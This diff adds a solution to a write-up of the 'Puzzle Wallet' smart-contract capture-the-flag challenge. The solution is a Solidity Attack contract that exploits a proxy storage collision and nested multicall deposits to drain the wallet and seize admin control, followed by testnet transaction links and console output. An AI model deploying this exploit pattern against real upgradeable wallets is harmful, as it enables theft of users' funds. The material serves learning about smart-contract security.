@@ -106,6 +106,52 @@ Challenge's message:
 # Subverting
 
 ```solidity
+pragma solidity ^0.8.20;
+
+interface IPuzzleWallet {
+    function proposeNewAdmin(address _newAdmin) external;
+    function addToWhitelist(address addr) external;
+    function deposit() external payable;
+    function multicall(bytes[] calldata data) external payable;
+    function execute(address to,uint256 value,bytes calldata data) external payable;
+    function setMaxBalance(uint256 _maxBalance) external;
+}
+
+contract Attack {
+
+    IPuzzleWallet target;
+
+    constructor(address _target) payable {
+        target = IPuzzleWallet(_target);
+    }
+
+    function attack()external payable{
+        target.proposeNewAdmin(address(this));
+        target.addToWhitelist(address(this));
+        bytes[] memory multicall_data = new bytes[](1);
+        multicall_data[0] = abi.encodeWithSelector(target.deposit.selector);
+        bytes[] memory data = new bytes[](2);
+        data[0] = multicall_data[0];
+        data[1] = abi.encodeWithSelector(target.multicall.selector,multicall_data);
+        target.multicall{value: 0.001 ether}(data);
+        target.execute(msg.sender, 0.002 ether, "");
+        target.setMaxBalance(uint256(uint160(msg.sender)));
+    }
+}
+```
+
+See transaction [on etherscan.](https://sepolia.etherscan.io/tx/0x2da8bb4ebf2d5d08fb66fb35243b48e32291ee1e1fa3d4593bf2b3cf6926cb79)
+
+```js
+await contract.owner()
+'0x725595BA16E76ED1F6cC1e1b65A88365cC494824'
+```
+
+See transaction [on etherscan.](https://sepolia.etherscan.io/tx/0x3d7753c99a314a2fd73ff6c742302572fbb7b65320cca9b0504a84407e2492ef)
+
+```js
+await contract.owner()
+'0x161b32b093F93FF8F43C250a448cA66a7fed4374'
 ```
 
 
